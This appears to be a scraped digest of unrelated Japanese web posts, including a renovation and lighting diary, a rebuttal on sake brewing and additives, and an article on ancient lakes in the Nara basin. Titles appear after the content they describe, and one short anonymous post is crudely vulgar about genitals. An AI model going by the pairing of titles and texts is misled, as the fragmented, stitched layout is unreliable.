安さに惹かれてパナのアラウーノにしたが、失敗した。パナはアラウーノの素材のことを「有機ガラス系新素材」とか言っているが、これは単なるプラスチック。普段は自慢の泡洗浄で汚れを防いているが、一度洗剤が切れると陶器の数倍の速さで汚れる。しかも洗剤の消費ペースが早く毎月補充が必要。めんどい。やはりトイレはTOTOにすべきだった。パナは商品設計はとても誠実なのに、どこかに弱点があると言葉のあやでごまかそうとするのがムカつく。パナソニックが聞きなれない単語を使い始めたら要注意だ！

手洗い器は洗面所と同じで、垂直面から水栓が生えているやつにしよう。その点でサンワカンパニーはダメ。あいつらインスタ映えすることばっかり一所懸命でメンテのことを忘れてる。

照明

調光可能な照明を入れる

人類は太陽の動きと連動して暮らす生活を何万年と続けてきたので、極力それに合わせた照明を計画するのが基本。究極は「日が沈んだら寝る」だが、現代人には無理ゲーなので「夕日が沈むのを遅らせる」のが照明の目的。なのでだんだん暗くできる調光可能な照明をいれる。夕日の代わりなので暖色にする。色温度が変わる機能は不要。増田は風呂や納屋も含めて調光可能にした。深夜になにかを思い出して、納屋やトイレに行ったときにバチっと全開でライトが付くのは不快だ。パナソニックがまさにそういった夜間だけ暗くなる人感センサースイッチを出している。

［トイレ壁取付］かってにスイッチ（換気扇連動・ほんのり点灯モード対応） | アドバンスシリーズ | スイッチ・コンセント（配線器具） | Panasonic

聞きなれない言葉かもしれない。これはタスク＝作業をする場所とアンビエント＝環境を照らす照明は別々に計画しましょうということだ。真っ暗な部屋でスマホライトをを下向きにすれば手元が照らされ、上向きにすれば部屋がぼんやり照らされる。照明は向きによって機能が変わる。食卓やキッチンなど何かしらの作業が発生する場所には下向きのライトで必要な明るさ確保、それだけでは全体が暗いので、上向きの間接照明で明るさを補うといい感じになる。食卓の上にペンダントライトを吊るのはオシャレのためではない。この「何かしらの作業が発生する場所」はライフステージの中で結構変動するので、照明の位置や向き、数を可変できる「照明ダクト+スポットライト」が増田のオススメ。白くて丸いシーリングライトはこれを一挙両得しようとする製品なのだが、タスクに必要な明るさを確保しようとするとアンビエントまで過剰に明るくなる。すると眼の光彩が絞られて手元が暗く感じる→さらに明るいシーリングライトを買ってきて・・・の無限ループに陥る。親のいる実家がどんどん明るくなるのはそのせい。

それでお前は何にした

タスクライト→天井に配線ダクトをつけまくり、MAXRAYのレトロフィットスポットライトMS10481-44にウシオ電機のCシリーズの電球。

LDR6/5 E11 φ65 ロング（スポットライト） | 照明器具のマックスレイ | ウシオライティング（製品サイト）

信頼できるメーカーで調光可能で演色性が高くてそれなりに安いとなるとこのへんになる。ウシオ電機は一般にはあまり知られていないかもしれないが、建築業界ではとても有名な照明メーカー。

LEDの寿命の前に、5年ぐらいで制御基板が壊れるので灯数が多いときは器具と電球は分けておいたほうがいい。

アンビエント→リビングはコイズミの棚上照明。商品名の通り壁面収納の上を間接照明にして天井を照らしている。

Shelf’s Compact Line｜シェルフズコンパクトライン｜コイズミ照明株式会社

寝室は壁面にパナのホームアーキの壁面ブラケット。天井には照明無し。

ＨｏｍｅＡｒｃｈｉ（ホームアーキ）｜ブラケット｜住宅用照明器具 | Panasonic

基本スイッチはすべてパナのリンクプラスで遠隔操作可能にした。正直高くついたしアプリは超クソだが、PSEを遵守したなかで選ぶとパナしかない。

スマート電球でリンクプラスの代用することも可能だがあまりオススメしない。演色性が低いのと基盤がすぐ壊れる。

アプリはクソなので(2回目)、これらをArduino+Homebridgeで自動制御しているが、詳細を書くとこの日記が3倍に膨れ上がってしまうので、そのうちQiitaにでも書く。5ちゃんのスマートホームスレには大いに助けられた。なお照明は製品設計としてそれなりに奥が深いので（インバーター周波数とか演色性とかカンデラとルクスとルーメンの違いetc）なるだけパナか照明専業メーカーのものを使おう。安いからってアイリスオーヤマとか買っちゃダメ！

[B! 家電] ブログ アイリスオーヤマのLEDシーリングライトのチラツキが酷い

パナのアプリがクソで思い出した。パナソニックの玄関ドアホン、このアプリも超クソだった。ピンポーンとなってからスマホで出るまでに30秒はかかる。 30秒もまたせたら相手は留守だとおもって立ち去ってしまう。それじゃあ、と思ってアイホン、Google Nest、Alexa Ring、も買ったが同様にクソ。どうしろと！！結果、AqaraのG4に落ち着いた。今んとこまともに機能するスマホドアホンはこれだけかも。

ツイートシェア
Title: マンションリフォーム虎の巻

Link: https://togetter.com/li/2316632
Content: 女子トイレが奥なのは、犯罪者が女子トイレ周辺をうろついたら明らかに不審だから 下手に手前や公道側にあると徘徊されやすいし「道に迷っていただけ」とか言い訳しやすい モールとかで女子トイレが奥にあったりするのもこの理由 男性が近付きにくいようになってる って聞いたことある x.com/parfaitthestud…
Title: 中央区の作り直したトイレが「男女の入り口が離れてる」「男性トイレに子供座らせる椅子がある」のでよい話…女性トイレの入り口が奥である理由についても

Link: https://shouyutechou.hatenablog.com/entry/2024/02/18/023352
Content: 東洋経済ONLINEに2月11日より掲載されている、『食品の裏側』著者である安部司さんの日本酒記事が、非常に悪い意味で話題になっております。

ここから3回分あるのかな

toyokeizai.net

『悪い意味で』と言っているのは、間違いが非常に多く、また一見すると合っているように見える意見でも、著者の思い込みだけの話であったり、知識が古いということが多いためです。

著者の方は、第二回のところで

「昔ながらのじっくり発酵させた酒がうまい」という私の意見に賛同してくれる声も多かった一方で、酒を速く作る技法である「速醸派」からはお叱りの声もいただきました。 繰り返しになりますが、あくまで酒は嗜好品です。 あくまで私の見解、昭和の古オヤジの一意見として受け止めていただければと思います。

と仰っているので、おそらく自分の知識が古い（アップデートできていない部分がある）ということに気づいておられないのでしょう。

もしくは、知っていて「あえて」食品の裏側を書くという著書の主張のためだったり、添加物を悪者としたいがために、このように書いているのではないでしょうか。

というわけで、ツッコミを入れていきたいと思います。かなり長くなってしまったので、目次をつけて二回目以降は後日に回します。

日本酒｢"添加物"で伝統的造り方が減少｣は問題か、を問題視する

1ページ目のツッコミどころ

まず、冒頭から、ここはどうでもいいかるーいツッコミです。

もうひとつは「高級酒」が売れていることです。1合2000円とか3000円とかいう高価なお酒がバンバン売れる店も増えています。



私たち昭和のオジサン軍団は1合700円とか、せいぜい1000円の酒を飲んできたけれど、今時は安い酒はかえって不人気です

「売れる」という言葉を使っているのでややこしいのですが、これは酒屋さんなどの酒販店で「四合瓶」や「一升瓶」として売られている日本酒ではなく、居酒屋などのお店で飲む場合のことなのでしょう。

その時点で、お店側がつける値段は原価率が異なったり、場所代やその他もろもろが加味されるので、昭和のオジサン軍団が飲むお酒と平等な条件での比較にはなっていないことは明らかです。

ちなみに、これも個人の感覚にはなってしまうのですが、昭和のオジサン軍団が飲むお酒で、安酒と主張したいのだったらもうちょっと安い（ちょっと前までは500円ぐらい）んじゃないかと思うのですがどうでしょうか。

2ページ目のツッコミどころ

造りに関しては、まあ、それほど多くの間違いがあるわけではありません。が、ちょっとだけツッコミたいところがあります。

この酛こそは、「日本酒の大元」ともいえる大事な存在です。「酛で味が8割決まる」と言う人もいるほど、重要なポイントです。

酛で味が8割決まるというのはどなたの言葉なのか、とても気になります。

酒蔵に伝わっている言葉は「一麹、二酛、三造り」という言葉です。ご自身でも3ページ目でこの言葉を紹介していて、一番大事なのは麹と書かれていますよね。

その通り、味のためには麹造りが一番大事で、酛はその次と言われているんです。酛で8割決まるというのは初耳でした。

現在でも、麹で工夫はいろいろ行われています。たとえば従来の日本酒で使われていた黄麹で造る麹だけでなく、焼酎を造るときに使われている白麹を日本酒に使う、なんてことがあるんですね。白麹は黄麹に比べると、クエン酸を多く生み出す性質があり、酸味が強い味わいの日本酒に仕上がります。同じ蔵でも黄麹のお酒と白麹のお酒だとまったく味が違うというのが、誰にでも分かるぐらいのレベルで変わるんです。有名なところでは、新政酒造さんの『亜麻猫』が白麹を使って醸された日本酒です。

おそらくなんですが、速醸系の酒母と、生酛系の酒母（後述）で味わいが変わるということを言いたいのかな……とも思います。確かにこの二つは製法が異なりますので、味わいが変わります。そして、この記事の主題ともなっている部分です。なので、8割変わるという表現にしたのではないでしょうか。

現在、速醸系の酒母は日本酒全体のだいたい9割、生酛系の酒母は日本酒全体のだいたい1割ほどです。なので、どうせ言うんだったら景気よく「酛で味が9割決まる」と言う方が、まだ正しい数値に見えるかと思われます。どうせならきちんとした根拠に基づく数字で盛っていきましょう！ まだ頑張れますヨ！

3ページ目のツッコミどころ

昔は、この酛を造る作業（生酛造り）が、それはそれは大変だったのです。蒸した米と麹をいくつかの小さな桶に分けて入れて、2～3時間おきに櫂棒でこね回します。これを「山卸（やまおろ）し」といいます。

こね回す（空気を入れたりする）わけではありません。「すり潰す」のです。何せ、山卸しの別名は「酛摺り（もとすり）」とも呼ばれるものですから、すり潰すのが重要なんですね。

ではなぜすりつぶすのか。

これは、お米を溶かすためです。大昔はお米を溶かすために頑張って手で混ぜて溶かしていたんですが、それじゃあ効率がわるいということで、江戸時代の中期から後期にかけて山卸しが開発されました。

はい、山卸しの歴史は、日本酒の歴史の中ではとりわけ古いというわけではなかったんですね。何せ日本酒はもっともっと昔からありますから。

櫂（かい）で混ぜることによって、手で混ぜるよりも大変衛生的で、期間を短縮することができ、楽になったのです。まあ、もちろん酛摺りが重労働であるのには変わりませんが、昔はもっと重労働だったのですね。

ここはまあ、言わずもがなではありますが、乳酸菌の力だけではありません。詳しくは後述しますが、生酛系ですとまずは硝酸還元菌が亜硝酸を作り出し、野生酵母や産幕酵母という、お酒を造るときには邪魔な酵母の生育を抑えるのです。

この技術によって、山廃でも雑菌が繁殖しなくて済むようになりました。そのあとに乳酸菌が育つ、というわけですね。

4ページ目以降のツッコミどころ

ここから微妙にいろんなところがごちゃ混ぜになっていて間違いが混在していてややこしいんですが、できるだけ整理していきましょう。

「山卸し・山廃」方式では酛造りに2～3週間かかるところ、この「速醸酛方式」だと2～5日程度で完成します。

こんなに早いことはまずありません。2日て。いくらなんでも盛りすぎです。

一方で、生酛が2〜3週間というのも短いです。造っている量にもよるんですが、ちょーっと短いですね。もうちょっと時間をください。

生酛系だとだいたい1カ月、速醸酛だとだいたい2週間と考えるといいでしょう。これも厳密には蔵によって異なります。でも、2日とかで完成することはないです。

これは、呼ばれないんですよ。明確な間違いなんです。勘違いされやすいんですが。

「高温糖化酛」もしくは「高温糖化酒母」と呼ばれるものと、「高温糖化法」では似て非なるものでして、この説明で呼ばれているものは「高温糖化法」なんです。決して「高温糖化酛」ではありません。

高温糖化酛は、広島県の中尾醸造4代目の中尾清麿氏が開発したものです。中尾氏は1927年に東京帝国大学で発酵を学んだ後、蔵に戻ったあとも日本酒にふさわしい新しい酵母を探し続けました。そうして見つけたのが、リンゴ酵母です。

ところが、リンゴ酵母は非常に弱く、そのままでは蔵付きの酵母に負けてしまうぐらいに弱かったのです。蔵付きの酵母はそれまで蔵で生存競争を勝ち抜いてきただけあって力強く、放っておいても入ってきちゃってリンゴ酵母を駆逐しちゃっていたのですね。

そこで7年かけて、1947年に開発されたのが高温糖化酒母法なのです。

蒸し米と麹と水を混ぜ合わせ、55℃で8時間保ちます。55℃は菌が生きていくのには非常に厳しい環境のため、さしもの蔵付き酵母もやられてしまいます。ところが、麹の酵素は60℃で失活（活動しなくなる）ため、ギリギリセーフ。というわけで、麹の作用はそのままに、雑菌を退治することができるというわけです。

その後、無菌状態になったもろみを20℃まで冷ましてリンゴ酵母を加えると、リンゴ酵母100％の酒母が完成するというわけです。

つまり、弱い酵母を使ってお酒を造るための技術として生み出されたものなんですね。そしてきっちりと麹を使っていて、酵素は添加していません。

先にちょっと触れましたが、昔から日本酒は「寒造り」といって極寒の中で造られてきました。寒い時期が、最も雑菌が繁殖しづらいからです。

ここも正確ではなくて。

寒造りが一般的になったのは、あくまで江戸中期以降の話です。それよりももっと前は、別に暖かい季節でも造られていたんですね。

生酛よりももっと古く、伝統がある「菩提酛」という造り方があります。室町時代中期に、奈良県の菩提山正暦寺で開発されたものです。

生米と炊いた米を水に漬けて数日間放置します。そうすると、空気中の乳酸菌が取り込まれて繁殖。酸っぱい水ができあがります。これを「そやし水」と言います。

この「そやし水」を使って酒母を育てるのが菩提酛です。水酛と呼ばれることもあります（この辺はややこしい理由があります）。

この造りは寒すぎるとできませんので、温暖な気候の中で造られていたというわけなんですね。

ちなみに現在の生酛系のみならず、速醸系の原型とも言われています。乳酸の入った水である「そやし水」を安定して造るのは非常に大変です。じゃあ、最初から乳酸を用意すればいいよね、という発想で速醸酛ができたというわけです。

そして、この暖かい季節に造っているお酒に対して、寒い時期にしか造れないタイプのお酒のことを「寒酛」と呼ぶようになったのです。だいたい江戸中期（元禄時代あたり）の話です。寒造りという言葉も当然それ以後に使われるようになったというわけです。

そしてこの寒酛が明治期に山廃・速醸が生まれた際に生酛と呼ばれるようになりました。なので頑張って遡っても、生酛は江戸からと言うことになるでしょう。

というわけで、非常に残念ながら、生酛造りは室町時代から続いている伝統ではありません。

山廃仕込みに至っては明治時代です。明治42年（1909年）ですね。

そして、この著者が敵視している速醸酛と、開発された年でいうと1年しか違いません。速醸は明治43年（1910年）に開発された技術なんです。

伝統という言葉を使いたいのなら、きちんと年代を明確にするといいでしょう。

生酛や山廃こそが「本来の酒」なんてことはありません。本来と呼ぶことの根拠がただ単に歴史があればいいということになると、映画『君の名は』でも有名になった、口噛み酒とかがもっとも伝統のある「本来の酒」になるかもしれませんよね。あ、八岐大蛇伝説で言うところの八塩折酒とかの方が「本来の酒」になるでしょうか。でも、ちょっと違いますよね。生酛や山廃や速醸だろうが、日本酒だったら「日本酒」で、その中の一ジャンルだけが本来の酒というわけではないんです。

生米をすり潰して、「乳酸」「アミラーゼ」などの添加物を駆使して造った酒が高く売れているというのは、なんだかおかしな現象のように私には思えてなりません。

生米をすりつぶして造るお酒で、そんなに高いお酒があるなら飲んでみたいのでぜひ教えて欲しいです！

そもそも日本酒の値段の高低は、お米の原価がどれだけかかるかと、どのぐらい時間をかけて造るかによって決まることの方が圧倒的に多いです。

お米は玄米の状態から精米してお酒を造ります。玄米を100％の状態とすると、どのぐらいまでにしたかの割合（精米歩合といいます）の数値が出るのですね。たとえば精米歩合60％と言ったら、4割ほど削る（お酒業界だと「磨く」という表現を使います）んです。

たとえばここに、40％まで磨いたお米と、80％まで磨いたお米があるとしましょう。たとえば、あるお酒を造るのに磨いた後のお米が10kg必要とします。40％のものだと25kgの玄米がなければなりません。80％のものだと、12.5kgの玄米で済みます。

ということは、精米歩合40％のものは、同80％のものに比べて、原価が倍かかっていると言えますよね。

こんな風に、お米を磨けば磨くほど原価がかかるのです。

そして、時間をかけて造れば造るほど（そういう製法にするほど）、人件費やら設備費やら何やらがかかるので、高くなるというのはわかりますよね。

著者の言っている、製造時間を短くしているお酒というのは、いわゆる日常消費用にお安く手に入れられるタイプのお酒で、値段も決して高くはないんです。なので、おかしな現象なのは、著者の思い込みによる幻想というわけですね。



山廃にも「添加」しているものがある

さて。ここで本題その1に入っておきましょう。

この著者の方は添加物は非常によろしくない、添加物の功罪を語るのがメインの方のようです。そして、基本的には添加物はない方が良いという主張の方のようです。

だとすると、ああ、大変です。

山廃は飲まない方がいいでしょう。そりゃあもう、加えちゃってますから！

そもそも山廃仕込みがなぜ成立するのか。本来なら山卸しを行うことで、雑菌の繁殖を抑えるわけですから、ただ山卸しをやらないだけだったらお米は溶けにくいし、雑菌が繁殖してしまいます。

じゃあどうするのか。

水を多めに、温度を高く仕込むのです。そうすることでお米が溶けやすくなり、すり潰す山卸しをしなくてもよくなるのです。「寒造り」とはまったく逆の発想なんですね。

でも、これだと雑菌の問題が解決していません。

そこで出てくるのが硝酸還元菌なんです。

硝酸還元菌は、亜硝酸を生み出します。この亜硝酸が雑菌を退治するのですね。つまり、最初に加える水の段階で硝酸還元菌が多かったら、雑菌の繁殖を抑制してくれるので、温度を高く水を多くしてもうまくいく、というわけです。

ところがこの硝酸還元菌は、水の中にミネラルが多く含まれる硬水じゃないと生きていけません。そして残念ながら、日本の多くの地域はミネラルがあまり含まれていない軟水なんです。硝酸還元菌が育ちません。

じゃあどうするか。はい、ミネラル剤を加えればいいんですね。

「硝酸カリウム」を添加すれば、水の中にミネラルを多く増やせば硝酸還元菌が活躍し、亜硝酸が生み出され、雑菌の繁殖が抑制できるのです。

これによって衛生状態が劇的に改善し、山廃を造るときに失敗することがないようになりました。

というわけで、非常に残念なことに、この著者の大好きな山廃には、硝酸カリウムが添加されていることが多いのです。そうしないと失敗してしまうので。

もちろん、硬水の地域で井戸水などで醸している蔵だったら添加しなくても大丈夫ではあります。そしてもちろん、硝酸カリウムを加えるといっても人体に影響が出る量を加えているわけではありません。水質を少しだけ硬水寄りにしているだけと考えればいいでしょう。

「添加物の功罪」という視点でいえば、日本酒に関しては「功」のほうが大きいとも私は考えています。

このように、添加物の「功」をもっとも享受している日本酒のひとつが、山廃仕込みというわけなんですね。

何でも簡略化が悪いわけではない

本題その2です。

著者の方（おそらく編集さんがつけた部分ではあると思いますが）は「簡略化の功罪を考える」とタイトル部分で言っていますよね。

当たり前なんですが、何でも簡略化が悪いわけではありません。

むしろ、日本酒の場合は経験則で行われていたことをしっかりと分析し、だとするとここをこうすればいいのでは、ということのくり返しになるのです。

ほとんどの蔵は、限られた中で、できるかぎりおいしいお酒を造ろうと試行錯誤をしています。いま大人気の蔵はもちろんそうですし、大手の蔵だってもちろんそうです。できるだけ安く、おいしいものを飲んでもらいたいと努力し続けているのですね。

それを、知識不足のまま、簡略化の功罪とか言われても、まったく響くものがないというわけです。多くの人が怒っているのは、そういう部分じゃないでしょうか。著者の人の味の好みとかは本当にどうでもいい話です。好きな物を持ち上げるために、他の物を落とす必要はないし、ましてや添加物は悪という主張に利用するなんてもってのほか、というわけですね。

まあ、そんなわけで二回目以降の記事も間違いや古い考えがアップデートできていない部分がたくさんありましたので、ツッコミ入れていきます。

続きです
Title: 日本酒「"添加物"で伝統的造り方が減少」していると嘆く人は、山廃を飲まない方がいい - 醤油手帖

Link: https://togetter.com/li/2314850?page=3
Content: ふらりと立ち寄れるスタンドに個室で優雅に楽しめるサロンなど、紅茶のおいしいお店まとめです。 2024年2月15日作成。

神奈川

愛知

岐阜
Title: 外でもおいしい紅茶が飲みたいんだ！紅茶派が絶賛オススメする「紅茶専門店」のクチコミ集めました【全国版】 (3ページ目)

Link: https://togetter.com/li/2317183
Content: ロミルワをかけるか明かりのアイテムを持っていると見えるやつ。あるいはシーフかニンジャに調べさせる
Title: 【デザインの敗北】国際フォーラムで見つけた秘密の入口

Link: https://togetter.com/li/2316903
Content: ガールズバーの女の子が「長時間のワンオペで足腰が限界だから、座りたい。でも座ると風営法に触れてしまうから座れない」と言い、苦悩の表情を浮かべていたので、私は風営法に詳しい人間として「カウンターの向こう側で椅子に座るだけなら風営法に触れないと思うよ」とアドバイスしました。
Title: ガールズバーの女の子が「長時間のワンオペで足腰が限界だから、座りたい。でも座ると風営法に触れてしまうから座れない」→風営法に詳しいからアドバイスした

Link: https://togetter.com/li/2316817
Content: ハーバーボッシュ法やんけ これ改めてみても革命よな x.com/s40132041i/sta…
Title: 農学部の作物研究室の先生が「これのせいで、100年間で世界の人口が15億人から60億人に増えた」って言ってた→「あ、空気からパンを作る魔法だ」

Link: https://anond.hatelabo.jp/20240218142207
Content: 現代のRPGにおけるダンジョンの原型が知りたい。

流れを逆から辿っていくと

・現代RPGにおけるダンジョン

↓

・古典RPGにおけるダンジョン

↓

・RPG誕生以前の「ファンタジー冒険譚」の中における「ダンジョンの原型」

↓

・「ダンジョンの原型」の元ネタ





って段階を踏んでるはず。

トールキンがいきなり「俺、天才だから「ダンジョン」という概念発明したわ」と無から生えてはいないはずなんだよね。

ぶっちゃけトールキンも昔からあった色んな伝承を合体させて「スーパー亜人大戦」みたいなのやっただけな所あったはずだし。

仮説としてはいくつか思いつくんだよ。

・原住民の住処を荒らす盗賊行為

・遺跡荒らし

・野生動物の巣

・未発見の鉱床

このあたりかなと。





あー書いてて思い出しちゃった。

『ミノタウロスの迷宮』があったな。

アレなんてかなーりダンジョンの原型に近いと思う。

そういう系だと「龍が守る宝を奪ってこい」って神話の類もかなり近いのかな。

でもなんだろう……違和感がある……。

そもそもなんでこんな神話が存在してる？





サキュバスと同じパターンかな……？

夢魔ってさ、不倫した人が使ってた言い訳だったんだよ。

「違うんだよ！これはサキュバスというモンスターの仕業なんだ！」「そうなんだ。じゃあ私のもインキュバスのせいってことだ」「おｋ」「じゃあそのサキュバス殺そうか」「クソガー！メイドに化けて忍び込みやがって―！」

みたいな感じね。

それと同じで「お前、その宝どうしたの？」「ドラゴンを倒して奪ったのさ！」「そっかー。てっきり先住民を虐殺して奪ったのかと思ったわ―」「なぜわかった？」「……バラさないからちょっと頂戴？」

みたいな感じなのでは……。

うーん……分からないね。

資料を一切見ないで仮説の上に仮説を重ねてもしゃーない。

なんかそういうのに詳しい本とかってある？

ツイートシェア
Title: ダンジョンの歴史に詳しい本ってないの？

Link: https://togetter.com/li/2317365
Content: トップ

2024年

2月

19日 New

『自分と違う価値観の人を見下すのは、学びを追求する者の姿勢としてあってはならないという話』についてのまとめ
Title: 『自分と違う価値観の人を見下すのは、学びを追求する者の姿勢としてあってはならないという話』【島っ子/ちばてつや先生】

Link: http://pandora11.com/blog-entry-4492.html
Content: 外国メディアの記事などに寄せられた、海外の方々の反応をお伝えします
Title: 海外「日本の保護下なら今ごろ…」 ハワイ王国が日本への編入を求めた歴史に驚きの声

Link: https://anond.hatelabo.jp/20240218201406
Content: ■ ちんちんに比べてまんこのデザイン手抜きすぎじゃね

ちんちんの完成度高いところ

しょんべんの狙いがつけやすい

セックスモードとしょんべんモードの変形機能

生理にならない

逆にまんこ笑

神はちんちん作って力尽きた感ある笑

ツイートシェア
Title: ちんちんに比べてまんこのデザイン手抜きすぎじゃね

Link: https://togetter.com/li/2316679
Content: リンク taiwanryugaku.com 台湾留学サポートセンター | 台湾留学のパイオニア 台湾留学・進学情報量No1、学校情報、奨学金、日本人留学生の体験談、大学選択に関するアドバイスなど、台湾留学に関する豊富な情報を提供しています。事前語学学習、入学申請手続き、ビザ取得など留学前の準備から、渡航後の留学生活に至るまで、台湾留学に関して全面的にサポートいたします。 2 users

400時間の事前学習
Title: 書類審査のみ100％合格、4年間で学費300万…魅力的？な台湾への留学「中国語とITが学べるのは強い」「語学学習費が…」

Link: https://togetter.com/li/2316703
Content: そうかあれからほぼ1年経ってたのか。

まとめ H3ロケット打ち上げ失敗、指令破壊。科学ライター・大貫剛氏の解説に涙「だいち3号が失われたのは痛恨」 くりあ氏のライブ見てたらないちゃった。 134447 pv 125 users

目次 打ち上げを見届けたヒトたち

打ち上げ成功

祝う声

喜びの記者会見 打ち上げを見届けたヒトたち
Title: H3ロケット再挑戦は見事成功 プロジェクト責任者の笑み溢れる記者会見に涙

Link: https://togetter.com/li/2316750
Content: 目次 わかる

自分がそのタイプ

そうとは限らない

みんなの反応 わかる

自分がそのタイプ
Title: 人付き合いが下手な人、人間が嫌いな人ほど、サービス業が上手いんだよねっていうお話←人間嫌い＝面倒事が嫌いなんだと思う

Link: https://anond.hatelabo.jp/20240218181948
Content: 電球に外部からエネルギーが供給され続けるってことと解釈する。 電球や配線などは十分小さく無視できるとする。 壁を作っているの光の反射率が100%なら、無限に光子（光の粒みたい...
Title: 科学詳しいマン教えて

Link: https://togetter.com/li/2316773
Content: 目次 チョロメ

昔から割と言う チョロメ

昔から割と言う
Title: 「あえてチョロメって呼ぶ文化圏あったよね？」客がChromeのことをチョロメって何度も言うから耐えきれず吹き出したらキレられた #事務ミス選手権

Link: https://note.com/jusojin/n/n683ae2c61038
Content: 京都の古い資料を見ていると京都盆地はかつて湖だったといいう文言をよく目にします。奈良盆地に関しても、以前の関西高低差大学の講義終了後の質疑応答で、「奈良盆地には、万葉集が詠まれた時代に湖があったのですか？」という質問があり、「湖と呼べる規模のものがあったかは懐疑的だが、今度調べてみますね」とお答えし、私・新之介の宿題になっていました。地形のなりたちを遡っていくと京都や奈良にも海水が侵入した時期がありましたが、それらは何十万年も前の話で、インターネット上にはその痕跡として湖が残っていたというような記事が存在しているようです。今回は、学校では教えてくれなかった京都盆地や奈良盆地の湖のお話です。

まずは大阪層群の変遷のはなし

大阪平野や京都盆地、奈良盆地などの地下には、「大阪層群」と呼ばれる地層が存在しています。礫・砂・粘土を主とする厚い地層で、その中に「海成粘土層」と呼ばれる地層が複数存在し、その粘土層の分布を調べることで、いつの時代にどこまで海水が侵入していたかが分かるのです。下記の古地理図は、その変遷をたどったものですので見ていきましょう。それぞれ『大阪府史 第一巻』に記載されている図版をトレースし着彩・加工しています。文字が変形しているのは歪みを修正したからです。

人類がまだ猿人の頃です

↑ 今から約300万年前から250万年前、初期の古大阪湖の中心は大阪湾南部にあり、奈良にも古奈良湖があってそれらは川でつながっていました。まだ生駒山地も六甲山もない準平原で、湖のまわりは盆地のように窪んでおり、水の流れは古奈良湖から古大阪湖へ流れていました。

人間の直接の祖先、ホモ属人類が現れ石器を使い出した頃です

↑ 今から約250万年前から150万年前、盆地の中心が北側に移り、湖が広範囲に広がって古奈良湖と北側でもつながりました。ただし、こんなに大きな湖があったわけではありません。古地理図は、ある一定の時間幅をきめて、その間に湖や海になったところを表現しています。上の図は時間幅が100万年もありますので、その間に水面が移動した範囲を示しています。古地理図に表現される海や湖は、このような水面が昔あったということではなく、水面の軌跡とご理解ください。誤解しやすい部分なのでご注意を。

人類の祖先がアフリカを脱出してユーラシアへ移動をはじめた頃です

↑ 今から約130万年前から150万年前、この時代に京都や奈良にも海水が侵入しました。汽水域となっているのは湖だった場所に海水が侵入してきたと考えられますが、古大阪湾の場合は湖が消滅した後の盆地に、海水が侵入し河川などの淡水が混ざって汽水になったと考えられています。ちなみに、まだ京都盆地も奈良盆地も生駒山地も存在していません。

人類の直接の祖先ではないですが、ジャワ原人が現れた頃です

↑ 今から約120万年前から100万年前、やや本格的な内湾が形成されました。古大阪湾の深さは10〜20メートルにもなったと考えられています。この時代から現在の山地エリアが緩やかに隆起し、大阪湾や京都盆地、奈良盆地が沈降をはじめます。

人類の直接の祖先ではないですが、北京原人が現れた頃です

↑ 今から約90万年前から50万年前、大阪層群の海成粘土層のなかで最も立派な第3海成粘土層と第6海成粘土層が形成された頃で安定した内湾が形成されました。六甲山地や生駒山地が徐々に成長をはじめて海に接する部分に崖が形成されました。この時代に古ハリマ湾と古奈良湾が消滅しているのは、山地が隆起をはじめたことで海水が侵入できなくなったからと思われます。

ヒト（ネアンデルタール人）がアフリカを出て世界中に広がっていったのが約６万年前。それよりも遥か昔の古地理図です。

↑ 今から約35万年前、この時代は近畿地方全般で地殻変動が激しくなり、盆地と山地との対立が拡大されていきました。いわゆる「六甲変動」と呼ばれる地殻変動です。六甲変動は約100万年前から始まったとされますが、約40万年前〜約20万年前は六甲変動最盛期で変動が最も激しく、六甲山地や生駒山地は一気に隆起しました。このときに古大阪湾は一気に縮小し古京都湾も消滅しました。京都盆地は、隆起と沈降を繰り返すうちに三方の山から流出する土砂によって複合扇状地を形成していきます。京都盆地に再び大きな池（巨椋池）が現れるのは約１万年前の縄文時代と考えられています。

奈良盆地の大和湖について。

奈良盆地のいわゆる大和湖に関する資料は少なく、最も信頼できるものとして昭和５８年に発行されている千田正美氏の『奈良盆地の景観と変遷』を参考にしました。それによると、六甲変動によって四方を山地に囲まれた奈良盆地は、四方の山から流れ出る水が排出できずに水が溜まっていきます。そして大和湖といわれる大きな湖が縄文時代に存在したと考えられているのです。その規模は今から６０００年ほど前には、水面が標高７０メートルの辺であったと推定されています。早速、カシミール３Dで当時の大和湖を再現してみましたが、にわかに信じがたい大きさになってしまいました。

縄文時代の奈良盆地と大和湖のイメージ

↑上の地形図は、水面の標高を７０メートルに設定し、奈良県史の縄文晩期の遺跡の場所プロットしてみた。縄文人の遺跡と汀線は確かに一致しています。千田氏は、その後、亀ノ瀬付近で断層による陥没ができて、大阪平野に水が排水され、２５００年以前には水面の標高が５０メートル辺まで低下したとされています。

弥生時代の奈良盆地と大和湖のイメージ

↑上の地形図は、水面を標高50mに設定したものです。青い印は弥生時代の集落。丸の大きさは集落の規模です。いまから２５００年前には、水がゆっくり抜けていくと同時に、湖岸平野に稲作が発達していき、河川沿いの自然堤防などの微高地に集落が形成されていきました。

↑上の地形図は、水面を標高50mに設定した中央部の拡大です。赤い丸の部分に古墳が３基確認できますが、古墳が造られているのは低湿地帯より一段高い段丘や自然堤防の上。この水位では古墳は造営できませんので、古墳時代には水が抜けて低湿地帯に広がる水田より一段高い場所に古墳が造営されたと思われます。つまり、古墳時代には大和湖は消滅したと考えられるのです。

↑上の図は、聖徳太子が 舎人 とねり ・ 調子麻呂 ちょうしまろ を従えて愛馬・ 黒駒 くろこま に乗り、斑鳩宮から飛鳥京へと通ったといわれる太子道（筋違道）の想定ルートを記しています。もし飛鳥時代に大和湖が存在していれば、太子道のルートも大幅に変わっていたでしょう。

↑上の歌は、万葉集に収められている 舒明天皇 じょめいてんのう （629〜641）が当時の飛鳥の様子を詠んだものです。海原や 鷗 かもめ など、大きな湖があったことを想起させますが、内容としては、平原のあちらこちらに立ち立ちする煙、水の上に鷗のしきりに飛び立つ光景に、よき国、秋津島なる大和の国をほめたたえるというもの。海原とは、香具山のふもとの 埴安池 はにやすのいけ のことと考えられ、近くに耳梨池や槃余池などがあり、それらの池を海原と詠んだと考えられます。 鷗 かもめ も海鳥の鷗がここにいたとは考えにくいですが、二上山や金剛山を越えると大阪湾ですので容易に行き来できたのかもしれません。

「奈良盆地には、万葉集が詠まれた時代に湖があったのですか？」の宿題に対する新之介の回答です。

回答：飛鳥時代の奈良盆地に大きな湖があったとは考えにくいです。ただし、縄文時代には大きな湖があったようです。その後の断層運動で、亀ノ瀬付近に陥没が起こり水がゆっくりと大阪湾側に排出されていきました。古墳時代には、湖底は陸化していたと考えられます。ただし、水田に一斉に水が入る季節には、奈良盆地全体がまるで大きな湖のように見えたことでしょう。
